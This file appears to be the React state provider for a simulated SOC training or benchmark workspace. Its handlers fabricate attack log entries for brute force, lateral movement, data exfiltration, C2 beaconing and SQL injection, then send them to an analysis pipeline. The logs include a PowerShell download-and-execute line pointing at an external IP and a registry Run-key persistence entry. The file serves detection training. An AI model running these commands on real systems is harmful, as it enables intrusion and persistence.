"use client";

import {
  createContext, useContext, useState, useRef, useCallback, useEffect,
  type ReactNode,
} from "react";
import { useRouter } from "next/navigation";
import {
  API_BASE, VALID_USERS, INTERNAL_HOSTS, VPN_GATEWAYS, C2_DOMAINS,
  CRED_LIST, DOCS, SQL_PATTERNS, ri, rIP, b64,
} from "@/constants";
import type { LogEntry, PipelineResult, DocEntry, AgentStatus, PipelineRun } from "@/types";

interface AppContextType {
  logs: LogEntry[];
  user: string | null;
  loginAttempts: number;
  credIdx: number;
  lateralStep: number;
  pipelineRunning: boolean;
  pipelineStage: string;
  pipelineResult: PipelineResult | null;
  pipelineAgents: AgentStatus[];
  activeRun: PipelineRun | null;
  setActiveRun: (run: PipelineRun | null) => void;
  showResults: boolean;
  setShowResults: (v: boolean) => void;
  docs: DocEntry[];
  addLog: (tag: string, message: string, extra?: Partial<LogEntry>) => void;
  navigate: (page: string) => void;
  handleLogin: (username: string, password: string) => void;
  handleCredStuffing: () => void;
  handleVPN: (succeed: boolean) => void;
  handleLateralMove: () => void;
  handleFileAccess: (doc: DocEntry) => void;
  handleRunScript: (filename: string) => void;
  handleC2Beacon: () => void;
  handleSearch: (query: string) => void;
  signOut: () => void;
}

const AppContext = createContext<AppContextType | null>(null);

export function useApp() {
  const ctx = useContext(AppContext);
  if (!ctx) throw new Error("useApp must be used within AppProvider");
  return ctx;
}

export function AppProvider({ children }: { children: ReactNode }) {
  const router = useRouter();
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [user, setUser] = useState<string | null>(null);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [credIdx, setCredIdx] = useState(0);
  const [lateralStep, setLateralStep] = useState(0);
  const firedTriggers = useRef(new Set<string>());
  const [fileAccessLog, setFileAccessLog] = useState<number[]>([]);
  const sessionIP = useRef(rIP());

  const [pipelineRunning, setPipelineRunning] = useState(false);
  const [pipelineStage, setPipelineStage] = useState("");
  const [pipelineResult, setPipelineResult] = useState<PipelineResult | null>(null);
  const [pipelineAgents, setPipelineAgents] = useState<AgentStatus[]>([]);
  const [activeRun, setActiveRun] = useState<PipelineRun | null>(null);
  const [showResults, setShowResults] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const addLog = useCallback((tag: string, message: string, extra: Partial<LogEntry> = {}) => {
    const ts = new Date().toTimeString().slice(0, 8);
    setLogs((prev) => [...prev, { id: Date.now() + Math.random(), ts, tag, message, ...extra }]);
  }, []);

  const startPolling = useCallback(
    (runId: string) => {
      if (pollRef.current) clearInterval(pollRef.current);
      pollRef.current = setInterval(async () => {
        try {
          const r = await fetch(`${API_BASE}/api/pipeline/results/${runId}`);
          const data: PipelineResult = await r.json();
          setPipelineStage(data.stage || "Processing...");
          if (data.agents) setPipelineAgents(data.agents);
          if (data.status === "completed") {
            if (pollRef.current) clearInterval(pollRef.current);
            setPipelineRunning(false);
            setPipelineResult(data);
            setShowResults(true);
            const score = data.scores?.overall ?? 0;
            addLog("SYSTEM", `[PIPELINE] Analysis complete - Score: ${score}/100 - Verdict: ${data.verdict}`);
          } else if (data.status === "failed") {
            if (pollRef.current) clearInterval(pollRef.current);
            setPipelineRunning(false);
            setPipelineAgents(data.agents || []);
            addLog("SYSTEM", `[PIPELINE] Analysis failed - check server logs`);
          }
        } catch { /* keep polling */ }
      }, 2000);
    },
    [addLog],
  );

  const triggerPipeline = useCallback(
    (type: string, detail: string, meta: Record<string, unknown> = {}) => {
      if (firedTriggers.current.has(type)) return;
      firedTriggers.current.add(type);
      addLog("TRIGGER", `! ${type} detected -> pipeline initiated`, { trigger: true });
      setPipelineRunning(true);
      setPipelineStage("Submitting logs to pipeline...");
      setActiveRun({ id: crypto.randomUUID(), type, detail, meta, startedAt: Date.now() });

      setTimeout(() => {
        setLogs((currentLogs) => {
          const logsToSend = currentLogs.map((l) => ({
            ts: l.ts, tag: l.tag, message: l.message, trigger: l.trigger || false,
          }));
          fetch(`${API_BASE}/api/pipeline/trigger`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ trigger_type: type, detail, meta, logs: logsToSend, session_ip: sessionIP.current }),
          })
            .then((r) => r.json())
            .then((data) => {
              if (data.run_id) {
                addLog("SYSTEM", `[PIPELINE] ${type} -> queued for SOC analysis (run: ${data.run_id.slice(0, 8)})`);
                startPolling(data.run_id);
              }
            })
            .catch(() => {
              addLog("SYSTEM", `[PIPELINE] ${type} -> failed to connect to analysis backend`);
              setPipelineRunning(false);
            });
          return currentLogs;
        });
      }, 200);
    },
    [addLog, startPolling],
  );

  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
  useEffect(() => {
    addLog("SYSTEM", "CyberBench Enterprise Workspace initialised");
    addLog("SYSTEM", `Session origin: ${sessionIP.current}`);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const navigate = useCallback(
    (page: string) => {
      addLog("PAGE_ACCESS", `User '${user}' navigated to /${page} [${sessionIP.current}]`);
      router.push(`/${page === "login" ? "" : page}`);
    },
    [addLog, user, router],
  );

  const signOut = useCallback(() => {
    addLog("SYSTEM", `User '${user}' signed out`);
    setUser(null);
    setLoginAttempts(0);
    setCredIdx(0);
    firedTriggers.current = new Set();
    router.push("/");
  }, [addLog, user, router]);

  const handleLogin = useCallback(
    (username: string, password: string) => {
      const ip = sessionIP.current;
      if (VALID_USERS[username] && VALID_USERS[username] === password) {
        addLog("AUTH_SUCCESS", `Authentication succeeded for '${username}' from ${ip}`);
        setLoginAttempts(0); setCredIdx(0); setUser(username);
        setTimeout(() => {
          addLog("USER_LOGIN", `Session granted - '${username}' entered workspace`);
          router.push("/dashboard");
        }, 400);
      } else {
        const n = loginAttempts + 1;
        setLoginAttempts(n);
        addLog("AUTH_FAIL", `Login failed for '${username}' from ${ip} [attempt ${n}]`);
        if (n >= 3) {
          addLog("BRUTE_FORCE", `Repeated failures from ${ip} - brute-force threshold reached`);
          triggerPipeline("BRUTE_FORCE", "High-frequency failed auth from single source", { ip });
        }
      }
    },
    [addLog, loginAttempts, triggerPipeline, router],
  );

  const handleCredStuffing = useCallback(() => {
    const [u, p] = CRED_LIST[credIdx % CRED_LIST.length];
    const ip = rIP();
    addLog("CRED_STUFFING", `Stuffed credential pair ${credIdx + 1}/5: '${u}':'${p}' from ${ip}`);
    setCredIdx((i) => i + 1);
    if (credIdx + 1 >= 3) {
      setTimeout(() => triggerPipeline("CRED_STUFFING", "Breached credential pairs detected across multiple IPs", { pairs: credIdx + 1 }), 300);
    }
  }, [addLog, credIdx, triggerPipeline]);

  const handleVPN = useCallback(
    (succeed: boolean) => {
      const gw = VPN_GATEWAYS[ri(0, 2)];
      const ip = rIP();
      if (succeed) {
        addLog("VPN_AUTH", `VPN session established via ${gw} from external IP ${ip}`);
        addLog("USER_LOGIN", `Post-VPN workspace access: '${user || "unknown"}' from ${ip}`);
      } else {
        addLog("VPN_AUTH_FAIL", `VPN auth failed at ${gw} from ${ip} - invalid certificate`);
        triggerPipeline("VPN_BRUTE", "Failed VPN authentication - possible credential probing", { gw, ip });
      }
    },
    [addLog, user, triggerPipeline],
  );

  const handleLateralMove = useCallback(() => {
    const src = INTERNAL_HOSTS[lateralStep % INTERNAL_HOSTS.length];
    const dst = INTERNAL_HOSTS[(lateralStep + 1) % INTERNAL_HOSTS.length];
    const ip = rIP();
    setLateralStep((s) => s + 1);
    addLog("LATERAL_MOVE", `SMB/WMI pivot: ${src} -> ${dst} using service account [${ip}]`);
    setTimeout(() => addLog("LDAP_QUERY", `LDAP: (&(objectClass=user)(memberOf=CN=Domain Admins,DC=corp,DC=local)) on ${dst}`), 350);
    setTimeout(() => addLog("LDAP_QUERY", `LDAP: Enumerated ${ri(12, 80)} user accounts on ${dst}`), 700);
    if (lateralStep >= 2) {
      setTimeout(() => triggerPipeline("LATERAL_MOVEMENT", "Service account pivoting across 3+ hosts", { hops: lateralStep + 1 }), 900);
    }
  }, [addLog, lateralStep, triggerPipeline]);

  const handleFileAccess = useCallback(
    (doc: DocEntry) => {
      addLog("FILE_ACCESS", `Opened: ${doc.name} [${doc.sens}] by '${user}'`);
      const now = Date.now();
      const recent = [...fileAccessLog, now].filter((t) => now - t < 10000);
      setFileAccessLog(recent);
      if (recent.length >= 4) {
        const totalMB = (recent.length * ri(8, 20)).toFixed(1);
        addLog("BULK_COPY", `${recent.length} files staged to clipboard/temp - ${totalMB} MB total`);
        setTimeout(() => {
          const extIP = `185.${ri(100, 220)}.${ri(1, 255)}.${ri(1, 254)}`;
          addLog("LARGE_UPLOAD", `Outbound HTTPS transfer: ${totalMB} MB -> ${extIP}:443`);
          triggerPipeline("DATA_EXFILTRATION", "Bulk file access followed by large outbound transfer", { files: recent.length, mb: totalMB });
        }, 900);
      }
    },
    [addLog, user, fileAccessLog, triggerPipeline],
  );

  const handleRunScript = useCallback(
    (filename: string) => {
      const extIP = `185.${ri(100, 220)}.${ri(1, 255)}.${ri(1, 254)}`;
      const cmd = `IEX(New-Object Net.WebClient).DownloadString('http://${extIP}/stage2.ps1')`;
      const enc = b64(cmd).slice(0, 48) + "...";
      addLog("PROCESS_SPAWN", `cmd.exe -> powershell.exe -NoP -NonI -W Hidden -Enc ${enc}  [parent: ${filename}]`);
      setTimeout(() => addLog("PROCESS_SPAWN", `Decoded payload: ${cmd.slice(0, 70)}...`), 500);
      setTimeout(() => addLog("SCHED_TASK", `New scheduled task registered: "WindowsUpdateHelper" - runs at logon, every 30 min`), 1000);
      setTimeout(() => {
        addLog("REG_WRITE", `Registry write: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  ->  "C:\\ProgramData\\svchost_update.exe"`);
        triggerPipeline("MALWARE_PERSISTENCE", "PowerShell dropper + scheduled task + registry run key", { file: filename });
      }, 1600);
    },
    [addLog, triggerPipeline],
  );

  const handleC2Beacon = useCallback(() => {
    const domain = C2_DOMAINS[ri(0, 2)];
    const extIP = `185.${ri(100, 220)}.${ri(1, 255)}.${ri(1, 254)}`;
    addLog("DNS_BEACON", `Suspicious DNS query: ${domain} -> resolved ${extIP} (Tor exit / bulletproof ASN)`);
    setTimeout(() => addLog("NET_CONN", `TCP keep-alive: ${extIP}:443  interval: ${ri(28, 90)}s  payload: ${ri(80, 240)}B (encrypted)`), 500);
    setTimeout(() => {
      addLog("NET_CONN", `Outbound traffic spike: ${(ri(15, 80) / 10).toFixed(1)} MB -> ${extIP}  protocol: HTTPS`);
      triggerPipeline("C2_COMMUNICATION", "Periodic DNS beacon + encrypted outbound to threat-actor ASN", { domain, extIP });
    }, 1000);
  }, [addLog, triggerPipeline]);

  const handleSearch = useCallback(
    (query: string) => {
      const isSqli = SQL_PATTERNS.some((p) => p.test(query));
      if (isSqli) {
        addLog("SQLI_ATTEMPT", `Injection payload in search: "${query.slice(0, 60)}" from ${sessionIP.current}`);
        setTimeout(() => addLog("SQLI_ATTEMPT", `DB error triggered - blind probe on table 'users' (column count: ${ri(4, 12)})`), 350);
        setTimeout(() => {
          const rows = ri(200, 8000);
          addLog("DB_EXFIL", `${rows} rows extracted via UNION SELECT - tables: users, sessions, api_keys`);
          triggerPipeline("WEB_SQL_INJECTION", "SQL injection -> successful DB row extraction", { endpoint: "/api/search", rows });
        }, 800);
      } else {
        addLog("SEARCH", `Search: "${query.slice(0, 40)}" by '${user}'`);
      }
    },
    [addLog, user, triggerPipeline],
  );

  return (
    <AppContext.Provider
      value={{
        logs, user, loginAttempts, credIdx, lateralStep,
        pipelineRunning, pipelineStage, pipelineResult, pipelineAgents, activeRun, setActiveRun, showResults, setShowResults,
        docs: DOCS, addLog, navigate,
        handleLogin, handleCredStuffing, handleVPN,
        handleLateralMove, handleFileAccess, handleRunScript, handleC2Beacon, handleSearch,
        signOut,
      }}
    >
      {children}
    </AppContext.Provider>
  );
}
